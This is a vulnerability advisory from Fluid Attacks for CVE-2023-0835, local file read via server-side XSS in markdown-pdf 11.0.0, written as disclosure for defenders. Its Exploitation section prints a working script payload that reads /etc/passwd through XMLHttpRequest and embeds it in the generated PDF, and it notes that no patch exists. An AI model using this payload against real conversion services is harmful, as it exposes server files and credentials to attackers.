---
slug: advisories/relsb/
title: markdown-pdf 11.0.0 - Local File Read via Server Side XSS
authors: Carlos Bello
writer: cbello
codename: relsb
product: markdown-pdf 11.0.0 - Local File Read
date: 2023-03-06 12:00 COT
cveid: CVE-2023-0835
severity: 7.5
description: markdown-pdf 11.0.0 - Local File Read via Server Side XSS
keywords: Fluid Attacks, Security, Vulnerabilities, Markdown, PDF, LFR
banner: advisories-bg
advise: yes
template: maskedAdvisory
encrypted: yes
---

## Summary

|                       |                                                                    |
| --------------------- | -------------------------------------------------------------------|
| **Name**              | markdown-pdf 11.0.0 - Local File Read                              |
| **Code name**         | [RelsB](https://en.wikipedia.org/wiki/Rels_B)                      |
| **Product**           | markdown-pdf                                                       |
| **Affected versions** | Version 11.0.0                                                     |
| **State**             | Public                                                             |
| **Release date**      | 2023-03-06                                                         |

## Vulnerability

|                       |                                                                                                                             |
| --------------------- | ----------------------------------------------------------------------------------------------------------------------------|
| **Kind**              | Server Side XSS                                                                                                             |
| **Rule**              | [425. Server Side XSS](https://docs.fluidattacks.com/criteria/vulnerabilities/425)                                          |
| **Remote**            | Yes                                                                                                                         |
| **CVSSv3 Vector**     | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N                                                                                |
| **CVSSv3 Base Score** | 7.5                                                                                                                         |
| **Exploit available** | Yes                                                                                                                         |
| **CVE ID(s)**         | [CVE-2023-0835](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-0835)                                               |

## Description

markdown-pdf version 11.0.0 allows an external attacker to remotely obtain
arbitrary local files. This is possible because the application does not
validate the Markdown content entered by the user.

## Vulnerability

This vulnerability occurs because the application does not validate that
the Markdown content entered by the user is not malicious.

## Exploitation

To exploit this vulnerability, we only need to send the following malicious
Markdown to markdown-pdf:

### Exploit.md

```html
<script>
    // Path Disclosure
    document.write(window.location);
    // Arbitrary Local File Read
    xhr = new XMLHttpRequest;
    xhr.onload=function(){document.write((this.responseText))};
    xhr.open("GET","file:///etc/passwd");
    xhr.send();
</script>
```

Thus, when markdown-pdf parses the malicious Markdown, it will return the local
file specified in the generated PDF.

## Evidence of exploitation

<iframe src="https://rb.gy/rph20g"
frameborder="0" width="835px" height="505px"
allowfullscreen></iframe>

![LFR-Node-PDF](https://user-images.githubusercontent.com/51862990/220176263-ca40f665-e82b-4521-8c86-42d76d7596be.png)

## Our security policy

We have reserved the ID CVE-2023-0835 to refer to this issue from now on.

* https://fluidattacks.com/advisories/policy/

## System Information

* Version: electron-pdf 11.0.0

* Operating System: GNU/Linux

## Mitigation

There is currently no patch available for this vulnerability.

## Credits

The vulnerability was discovered by [Carlos
Bello](https://www.linkedin.com/in/carlos-andres-bello) from Fluid Attacks'
Offensive Team.

## References

**Vendor page** <https://www.npmjs.com/package/markdown-pdf/>

## Timeline

<time-lapse
  discovered="2023-02-20"
  contacted="2023-02-20"
  replied="2023-02-20"
  confirmed=""
  patched=""
  disclosure="">
</time-lapse>
